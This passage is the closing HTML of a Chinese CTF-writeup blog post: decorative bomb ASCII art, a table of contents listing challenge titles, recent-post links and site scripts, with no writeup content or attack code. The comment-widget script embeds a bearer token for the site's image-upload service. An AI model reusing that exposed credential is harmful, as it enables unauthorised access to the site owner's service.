line-height: 1 !important;">
.------.--------.---------.
| .=====================. |\
| | 7  3  5  5  6  0  8 | | |
| +=====================+ | |
|----------------------\\-. |
|    *   |      ^|^    || |\|
|   .-----------------.|| | |
|   |  1  |  2  |  3  ||| | |
|   |-----+-----+-----||| | |
|   |  4  |  5  |  6  ||| | |
|   |-----+-----+-----||| | |
|   |  7  |  8  |  9  ||| | |
|   |-----+-----+-----|// | |
|   |  *  |  0  |  #  |/  | |
|   +-----------------+   | |
|       |       |         | |
+-------+-------+---------+ |
\______\_______\_________+\/
</pre></div>
<div align="center"><span style="color: #e9b891;">gamernotitle</span>@<span style="color: #c5966d;">site_web</span> > <span style="color: #4a6d42;">./plant.sh</span><br>
Boom has been planted.
</div>
</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DS-easydatalog-Luminoria-%E6%9C%AA%E5%87%BA"><span class="toc-number">1.</span> <span class="toc-text">[DS] easydatalog | @Luminoria | 未出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DS-DSASignatureData-Luminoria"><span class="toc-number">2.</span> <span class="toc-text">[DS] DSASignatureData | @Luminoria</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto-matrixRSA-KeqingMoe"><span class="toc-number">3.</span> <span class="toc-text">[Crypto] matrixRSA | @KeqingMoe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-%E7%B3%9F%E7%B3%95%E7%9A%84%E7%A3%81%E7%9B%98-Luminoria-%E8%B5%9B%E5%90%8E%E5%87%BA"><span class="toc-number">4.</span> <span class="toc-text">[MISC] 糟糕的磁盘 | @Luminoria | 赛后出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%9B%E4%B8%AD"><span class="toc-number">4.1.</span> <span class="toc-text">赛中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%9B%E5%90%8E"><span class="toc-number">4.2.</span> <span class="toc-text">赛后</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-CSCS-Luminoria-%E6%9C%AA%E5%87%BA"><span class="toc-number">5.</span> <span class="toc-text">[MISC] CSCS | @Luminoria | 未出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%9B%E4%B8%AD-1"><span class="toc-number">5.1.</span> <span class="toc-text">赛中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%9B%E5%90%8E-1"><span class="toc-number">5.2.</span> <span class="toc-text">赛后</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Rank-I-Ron"><span class="toc-number">6.</span> <span class="toc-text">[Web] Rank-I | @Ron</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-BitDance-Jeremiah"><span class="toc-number">7.</span> <span class="toc-text">[Reverse] BitDance | @Jeremiah</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/Migrate-from-Valine-to-Waline/" title="从 Valine 迁移到 Waline 全记录"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Migrate-from-Valine-to-Waline/msedge_1kiyjac8P9.png" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/404/404.png'" alt="从 Valine 迁移到 Waline 全记录"/></a><div class="content"><a class="title" href="/posts/Migrate-from-Valine-to-Waline/" title="从 Valine 迁移到 Waline 全记录">从 Valine 迁移到 Waline 全记录</a><time datetime="2026-02-15T19:00:46.000Z" title="Created 2026-02-16 03:00:46">2026-02-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Reverse-Engineering-Cracking-MailMaster/" title="记一次对某邮箱软件账户数量上限破解"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Reverse-Engineering-Cracking-MailMaster/at-748365_1920.jpg" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/404/404.png'" alt="记一次对某邮箱软件账户数量上限破解"/></a><div class="content"><a class="title" href="/posts/Reverse-Engineering-Cracking-MailMaster/" title="记一次对某邮箱软件账户数量上限破解">记一次对某邮箱软件账户数量上限破解</a><time datetime="2026-01-19T12:34:03.000Z" title="Created 2026-01-19 20:34:03">2026-01-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2025-Year-End-Summary/" title="2025 年终总结"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/2025-Year-End-Summary/image-20251231025211777.png" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/404/404.png'" alt="2025 年终总结"/></a><div class="content"><a class="title" href="/posts/2025-Year-End-Summary/" title="2025 年终总结">2025 年终总结</a><time datetime="2025-12-30T17:10:19.000Z" title="Created 2025-12-31 01:10:19">2025-12-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/bkcrack-known-bytes-attack-decipher/" title="使用 bkcrack 对 ZipCrypto 加密的 ZIP 文件进行明文爆破"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/bkcrack-known-bytes-attack-decipher/cover.png" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/404/404.png'" alt="使用 bkcrack 对 ZipCrypto 加密的 ZIP 文件进行明文爆破"/></a><div class="content"><a class="title" href="/posts/bkcrack-known-bytes-attack-decipher/" title="使用 bkcrack 对 ZipCrypto 加密的 ZIP 文件进行明文爆破">使用 bkcrack 对 ZipCrypto 加密的 ZIP 文件进行明文爆破</a><time datetime="2025-12-19T12:59:03.000Z" title="Created 2025-12-19 20:59:03">2025-12-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/CTF-PCB2025-Preliminary-Round-Writeup/" title="2025 第五届“鹏城杯”联邦网络靶场协同攻防演练（初赛）个人 Writeup"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-PCB2025-Preliminary-Round-Writeup/cover.jpg" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/404/404.png'" alt="2025 第五届“鹏城杯”联邦网络靶场协同攻防演练（初赛）个人 Writeup"/></a><div class="content"><a class="title" href="/posts/CTF-PCB2025-Preliminary-Round-Writeup/" title="2025 第五届“鹏城杯”联邦网络靶场协同攻防演练（初赛）个人 Writeup">2025 第五届“鹏城杯”联邦网络靶场协同攻防演练（初赛）个人 Writeup</a><time datetime="2025-12-13T11:05:12.000Z" title="Created 2025-12-13 19:05:12">2025-12-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2018 - 2026 By GamerNoTitle</div><div class="framework-info"><span>Framework </span><a href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">All articles in this blog are licensed under CC BY-NC-SA 4.0 unless stating additionally.<br>
<a href="https://icp.gov.moe/?keyword=20213338" target="_blank"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src='https://assets.bili33.top/img/GovMoe/icon120.png' width=20px height=20px></img> 萌ICP备 20213338号</a> | <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.bili33.top/gh/biliCDN/bilicdn.github.io@master/images/favicon.png" width="20px" height="20px"> 本站使用 <a href="https://cdn.bili33.top">哔哩CDN</a> 进行加速<br>
</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.bili33.top/npm/@fancyapps/ui@4.0.31/dist/fancybox.umd.min.js"></script><script src="https://cdn.bili33.top/npm/vanilla-lazyload@17.8.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.bili33.top/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.bili33.top/npm/pangu@4.0.7/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const $mermaidWrap = document.querySelectorAll('#article-container .mermaid-wrap')
  if ($mermaidWrap.length) {
    window.runMermaid = () => {
      window.loadMermaid = true
      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

      Array.from($mermaidWrap).forEach((item, index) => {
        const mermaidSrc = item.firstElementChild
        const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
        const mermaidID = 'mermaid-' + index
        const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
        mermaid.mermaidAPI.render(mermaidID, mermaidDefinition, (svgCode) => {
          mermaidSrc.insertAdjacentHTML('afterend', svgCode)
        })
      })
    }

    const loadMermaid = () => {
      window.loadMermaid ? runMermaid() : getScript('https://cdn.bili33.top/npm/mermaid@9.1.7/dist/mermaid.min.js').then(runMermaid)
    }

    window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
  }
})()</script><script>function loadWaline () {
  function insertCSS () {
    const link = document.createElement("link")
    link.rel = "stylesheet"
    link.href = "https://assets.bili33.top/css/waline.css"
    document.head.appendChild(link)
  }

  function initWaline () {
    const waline = Waline.init(Object.assign({
      el: '#waline-wrap',
      serverURL: 'https://waline.bili33.top',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      path: window.location.pathname,
      comment: false,
      imageUploader: (file) => {
        let formData = new FormData();
        let headers = new Headers();
        let query = new URLSearchParams();

        formData.append('file', file);
        headers.append('Authorization', 'Bearer imgbed_YdVn2QPSD7RjaCDYIODMnlyY8wAn3FZD')
        headers.append('User-Agent', 'Paff-Waline/1.0')

        return fetch('https://img.bili33.top/upload', {
          method: 'POST',
          headers: headers,
          body: formData,
        }).then((resp) => resp.json())
        .then((data) => 'https://img.bili33.top' + data[0].src)
      }

    }, {"avatar":"mp","emojiCDN":"https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/","visitor":true,"emoji":["https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/bilibiliHotKey","https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/bilibili2233","https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/bilibilitv","https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/Arcaea","https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/Heybox","https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/Majotabi"],"locale":{"nick":"昵称","nickError":"昵称不能少于3个字符","mail":"邮箱","mailError":"请填写正确的邮件地址","link":"网址","optional":"可选","placeholder":"📌图片上传大小限制 5MB，请友善发言，并遵守相关法律法规。","sofa":"来发评论吧~","submit":"提交","like":"喜欢","cancelLike":"撤销喜欢","reply":"回复","cancelReply":"撤回","comment":"评论","refresh":"刷新","more":"加载更多...","preview":"预览","emoji":"表情","uploadImage":"上传图片","seconds":"秒前","minutes":"分钟前","hours":"小时前","days":"天前","now":"刚刚","uploading":"Uploading","login":"登录","logout":"登出","admin":"Endministrator","sticky":"📌","word":"字","wordHint":"评论字数应在 $0 到 $1 字之间！\\n当前字数：$2","anonymous":"匿名","level0":"Lv0","level1":"Lv1","level2":"Lv2","level3":"Lv3","level4":"Lv4","level5":"Lv5","gif":"表情包","gifSearchPlaceholder":"搜索表情包","profile":"个人资料","approved":"通过","waiting":"待审核","spam":"垃圾","unsticky":"取消置顶","oldest":"倒序","latest":"正序","hottest":"热度","reactionTitle":"你认为这篇文章怎么样？"},"noCopyright":true,"reaction":false}))
  }

  if (typeof Waline === 'function') initWaline()
  else {
    insertCSS()
    getScript('https://assets.bili33.top/js/waline.umd.js').then(initWaline)
  }
}

if ('Waline' === 'Waline' || !true) {
  if (true) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
  else setTimeout(loadWaline, 0)
} else {
  function loadOtherComment () {
    loadWaline()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><link rel="stylesheet" href="https://cdn.bili33.top/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.bili33.top/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script src="https://cdn.bili33.top/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: true,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', 'UA-138072700-2', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>